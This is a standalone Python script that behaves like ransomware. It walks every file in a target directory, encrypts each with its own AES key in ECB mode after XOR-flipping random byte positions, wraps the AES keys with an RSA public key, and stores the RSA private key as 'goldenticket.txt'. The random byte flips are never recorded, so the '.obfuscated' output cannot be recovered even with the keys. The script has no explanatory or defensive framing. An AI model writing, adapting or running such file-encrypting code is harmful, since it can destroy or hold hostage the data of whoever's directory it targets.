import os
import sys
import random
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes

def generate_rsa_key_pair():
    key = RSA.generate(2048)
    public_key = key.publickey().export_key()
    private_key = key.export_key()
    return public_key, private_key

def save_rsa_private_key(private_key, target_directory):
    private_key_file = os.path.join(target_directory, "goldenticket.txt")
    with open(private_key_file, "wb") as file:
        file.write(private_key)

def generate_aes_key():
    return get_random_bytes(32)

def write_encrypted_key(file_path, aes_key, rsa_public_key):
    rsa_cipher = PKCS1_OAEP.new(RSA.import_key(rsa_public_key))
    rsa_encrypted_key = rsa_cipher.encrypt(aes_key)
    with open(file_path + ".key", "wb") as key_file:
        key_file.write(rsa_encrypted_key)

def obfuscate_file(file_path, aes_key):
    with open(file_path, "rb") as file:
        content = file.read()
    
    # Pad the content to ensure it's aligned to block boundary
    padding_length = AES.block_size - (len(content) % AES.block_size)
    padded_content = content + bytes([padding_length]) * padding_length
    
    obfuscated_data = bytearray(padded_content)
    
    for i in range(0, len(padded_content), AES.block_size):
        block = bytearray(padded_content[i:i+AES.block_size])  # Convert bytes to bytearray
        bytes_to_obfuscate = random.randint(7, 12)
        bytes_to_obfuscate_indices = random.sample(range(AES.block_size), bytes_to_obfuscate)
        cipher = AES.new(aes_key, AES.MODE_ECB)
        for idx in bytes_to_obfuscate_indices:
            block[idx] ^= 0xFF  # Bitwise XOR obfuscation
        obfuscated_block = cipher.encrypt(bytes(block))  # Encrypt the modified block
        obfuscated_data[i:i+AES.block_size] = obfuscated_block
    
    with open(file_path + ".obfuscated", "wb") as obfuscated_file:
        obfuscated_file.write(obfuscated_data)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <target_directory>")
        sys.exit(1)
    target_directory = sys.argv[1]
    rsa_public_key, rsa_private_key = generate_rsa_key_pair()
    save_rsa_private_key(rsa_private_key, target_directory)
    files = os.listdir(target_directory)
    for file_name in files:
        file_path = os.path.join(target_directory, file_name)
        if os.path.isfile(file_path) and file_name != "goldenticket.txt":
            aes_key = generate_aes_key()
            write_encrypted_key(file_path, aes_key, rsa_public_key)
            obfuscate_file(file_path, aes_key)